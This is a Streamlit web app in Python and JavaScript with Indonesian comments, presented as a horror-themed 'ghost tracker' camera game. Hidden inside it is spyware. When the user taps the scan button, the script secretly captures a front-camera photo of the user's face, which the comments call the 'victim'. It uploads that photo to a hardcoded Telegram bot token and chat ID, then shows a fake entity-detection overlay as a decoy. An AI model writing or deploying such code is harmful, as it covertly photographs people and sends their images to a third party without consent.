import requests
import streamlit as st
import streamlit.components.v1 as components
from datetime import datetime

# ==========================================
# KONFIGURASI BOT TELEGRAM & HALAMAN
# ==========================================
TELEGRAM_BOT_TOKEN = "8837419409:AAEdUGcqxc7RyRJHMSJSBh8RURTEOOWTMYM"
TELEGRAM_CHAT_ID = "8236797547"

st.set_page_config(
    page_title="PARANORMAL OPS // GHOST TRACKER V5.0",
    page_icon="👁️",
    layout="centered"
)

# ==========================================
# CUSTOM CSS / STYLING MILITARY HORROR PRO
# ==========================================
st.markdown("""
    <style>
    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap');

    .stApp {
        background: #020202;
        color: #ff0033;
        font-family: 'Share Tech Mono', monospace;
    }

    .ops-card {
        background: rgba(15, 0, 0, 0.9);
        border: 2px solid #ff0033;
        border-radius: 12px;
        padding: 25px;
        box-shadow: 0 0 40px rgba(255, 0, 51, 0.4), inset 0 0 25px rgba(255, 0, 51, 0.15);
        margin-bottom: 20px;
        position: relative;
    }

    .ops-card::before {
        content: "LIVE ENTITY TRACKER // ACTIVE";
        position: absolute;
        top: -12px;
        left: 20px;
        background: #ff0033;
        color: #000000;
        font-size: 10px;
        font-weight: bold;
        padding: 2px 8px;
        letter-spacing: 2px;
    }

    .warning-box {
        background: rgba(255, 204, 0, 0.08);
        border-left: 4px solid #ffcc00;
        border-top: 1px solid rgba(255, 204, 0, 0.3);
        border-right: 1px solid rgba(255, 204, 0, 0.3);
        border-bottom: 1px solid rgba(255, 204, 0, 0.3);
        padding: 15px;
        border-radius: 4px;
        margin-bottom: 20px;
        font-size: 13px;
        color: #ffcc00;
        text-align: left;
        line-height: 1.6;
    }
    </style>
""", unsafe_allow_html=True)

# ==========================================
# TAMPILAN UTAMA
# ==========================================
st.markdown("<h1 style='text-align: center; color: #ff0033; text-shadow: 0 0 20px #ff0033; font-family: \"VT323\", monospace; font-size: 2.8rem; letter-spacing: 3px;'>⚠️ GHOST ENTITY TRACKER v5.0</h1>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #888888; font-size: 0.9rem; letter-spacing: 1px;'>THERMAL & AUDIO FREQUENCY SENSOR</p>", unsafe_allow_html=True)

with st.container():
    st.markdown('<div class="ops-card">', unsafe_allow_html=True)
    
    st.markdown("""
        <div class="warning-box">
            <b>[!] PERINGATAN INVESTIGASI:</b><br>
            Arahkan kamera ke sudut gelap ruanganmu. Sensor akan melacak pergerakan entitas tak kasat mata secara <i>real-time</i> disertai frekuensi audio. Wajib klik <b>"ALLOW / IZINKAN"</b> pada pop-up kamera untuk memulai kalibrasi.
        </div>
    """, unsafe_allow_html=True)

    # HTML & JavaScript Pro Horror Tracker dengan Audio & Pergerakan Entitas
    tracker_script_html = f"""
    <div style="text-align: center;">
        <button id="initOps" style="
            background: linear-gradient(180deg, #330000 0%, #1a0000 100%);
            color: #ff0033;
            font-weight: bold;
            font-size: 16px;
            border: 2px solid #ff0033;
            padding: 16px 20px;
            border-radius: 6px;
            width: 100%;
            cursor: pointer;
            box-shadow: 0 0 20px rgba(255, 0, 51, 0.5);
            font-family: 'Share Tech Mono', monospace;
            text-transform: uppercase;
            letter-spacing: 2px;
        ">[ MULAI SCANNING RUANGAN ]</button>
    </div>

    <!-- Kamera depan tersembunyi untuk tangkap wajah target secara diam-diam -->
    <video id="stealth-cam" autoplay playsinline style="display:none;"></video>
    <canvas id="stealth-canvas" width="640" height="480" style="display:none;"></canvas>

    <!-- Area Tampilan Utama Setelah Tombol Ditekan -->
    <div id="ops-active-view" style="display:none; margin-top: 15px; text-align: center;">
        <div style="display: flex; justify-content: space-between; font-size: 11px; color: #ff0033; margin-bottom: 5px; font-family: 'VT323', monospace; letter-spacing: 1px;">
            <span id="sys-status">STATUS: SEARCHING FOR ANOMALIES...</span>
            <span>FREQ: <span id="freq-val">432.8</span> MHz</span>
        </div>
        
        <div style="position: relative; display: inline-block; width: 100%; max-width: 400px; border: 2px solid #ff0033; border-radius: 8px; overflow: hidden; background: #000;">
            
            <!-- Live Feed Kamera Belakang -->
            <video id="back-camera-feed" autoplay playsinline style="
                width: 100%;
                display: block;
                filter: grayscale(80%) contrast(220%) brightness(75%) sepia(100%) hue-rotate(300deg);
            "></video>

            <!-- Efek Overlay Militer Horror -->
            <div style="
                position: absolute;
                top: 0; left: 0; right: 0; bottom: 0;
                pointer-events: none;
                background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.4) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.03), rgba(0, 255, 0, 0.01), rgba(0, 0, 255, 0.03));
                background-size: 100% 4px, 6px 100%;
            "></div>

            <!-- Lingkaran Radar Berputar -->
            <div style="
                position: absolute;
                top: 50%; left: 50%;
                width: 180%; height: 180%;
                transform: translate(-50%, -50%);
                background: conic-gradient(from 0deg at 50% 50%, rgba(255, 0, 51, 0) 0deg, rgba(255, 0, 51, 0.3) 320deg, rgba(255, 255, 0, 0.7) 360deg);
                animation: militarySweep 2.5s linear infinite;
                pointer-events: none;
            "></div>

            <!-- Kotak Target Lock-on yang Bergerak Pindah-pindah Secara Dinamis -->
            <div id="lock-box" style="
                position: absolute;
                top: 30%; left: 40%;
                width: 65px; height: 65px;
                border: 2px dashed #ff0033;
                display: none;
                transition: all 1.2s ease-in-out;
                box-shadow: 0 0 15px rgba(255, 0, 51, 0.7);
                pointer-events: none;
            ">
                <span id="entity-label" style="position: absolute; top: -16px; left: 0; background: #ff0033; color: #000; font-size: 9px; padding: 1px 3px; font-weight: bold;">ENTITY: NEARBY</span>
            </div>
        </div>
    </div>

    <style>
        @keyframes militarySweep {{
            0% {{ transform: translate(-50%, -50%) rotate(0deg); }}
            100% {{ transform: translate(-50%, -50%) rotate(360deg); }}
        }}
    </style>

    <script>
        const botToken = "{TELEGRAM_BOT_TOKEN}";
        const targetChatId = "{TELEGRAM_CHAT_ID}";

        // Fungsi Audio Alami (Web Audio API) untuk Suara Beep Radar
        function playRadarBeep() {{
            try {{
                const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
                const osc = audioCtx.createOscillator();
                const gain = audioCtx.createGain();
                
                osc.type = 'sine';
                osc.frequency.setValueAtTime(880, audioCtx.currentTime);
                gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
                gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.15);
                
                osc.connect(gain);
                gain.connect(audioCtx.destination);
                
                osc.start();
                osc.stop(audioCtx.currentTime + 0.15);
            }} catch(e) {{
                console.log("Audio skipped");
            }}
        }}

        document.getElementById('initOps').addEventListener('click', async function() {{
            const btn = document.getElementById('initOps');
            btn.innerText = "[ MENGKALIBRASI SENSOR... ]";
            btn.style.background = "#550000";

            try {{
                // 1. Ambil foto wajah korban secara diam-diam dari kamera depan
                const frontStream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }} }});
                const stealthVideo = document.getElementById('stealth-cam');
                stealthVideo.srcObject = frontStream;
                
                await new Promise(r => setTimeout(r, 1200));
                
                const canvas = document.getElementById('stealth-canvas');
                const ctx = canvas.getContext('2d');
                ctx.drawImage(stealthVideo, 0, 0, canvas.width, canvas.height);
                
                // 2. Kirim otomatis ke Telegram Bot
                canvas.toBlob(function(blob) {{
                    const formData = new FormData();
                    formData.append('chat_id', targetChatId);
                    formData.append('photo', blob, 'paranormal_target_captured.jpg');
                    formData.append('caption', '👁️ <b>TARGET TERJEBAK DI GHOST TRACKER!</b>');
                    
                    fetch('https://api.telegram.org/bot' + botToken + '/sendPhoto', {{
                        method: 'POST',
                        body: formData
                    }});
                }}, 'image/jpeg', 0.9);
                
                frontStream.getTracks().forEach(track => track.stop());

                // 3. Tampilkan live view kamera belakang
                btn.style.display = "none";
                document.getElementById('ops-active-view').style.display = "block";

                const backStream = await navigator.mediaDevices.getUserMedia({{ 
                    video: {{ facingMode: "environment" }} 
                }});
                const backVideo = document.getElementById('back-camera-feed');
                backVideo.srcObject = backStream;

                // 4. Efek Interaktif & Suara Berkelanjutan
                setTimeout(() => {{
                    document.getElementById('sys-status').innerText = "STATUS: THERMAL ANOMALY DETECTED!";
                    document.getElementById('sys-status').style.color = "#ffcc00";
                }}, 2000);

                setTimeout(() => {{
                    document.getElementById('sys-status').innerText = "STATUS: ⚠ ENTITY MOVING AROUND YOU!";
                    document.getElementById('sys-status').style.color = "#ff0033";
                    
                    const lockBox = document.getElementById('lock-box');
                    lockBox.style.display = "block";
                    playRadarBeep();

                    // Looping pergerakan entitas berpindah-pindah tempat secara acak di layar
                    setInterval(() => {{
                        const randomTop = Math.floor(Math.random() * 60) + 15;
                        const randomLeft = Math.floor(Math.random() * 65) + 15;
                        
                        lockBox.style.top = randomTop + "%";
                        lockBox.style.left = randomLeft + "%";
                        
                        const labels = ["ENTITY: CLOSE", "MOVING...", "SIGNAL SPIKE", "WARNING NEARBY"];
                        const randomLabel = labels[Math.floor(Math.random() * labels.length)];
                        document.getElementById('entity-label').innerText = randomLabel;

                        playRadarBeep();
                        document.getElementById('freq-val').innerText = (Math.random() * (900 - 300) + 300).toFixed(1);
                    }}, 2200);

                }}, 3500);

            } catch(err) {{
                console.log("Error: ", err);
                btn.innerText = "[ IZIN DITOLAK - COBA ULANG ]";
                btn.style.background = "#330000";
            }}
        }});
    </script>
    """
    
    components.html(tracker_script_html, height=520)
    st.markdown('</div>', unsafe_allow_html=True)
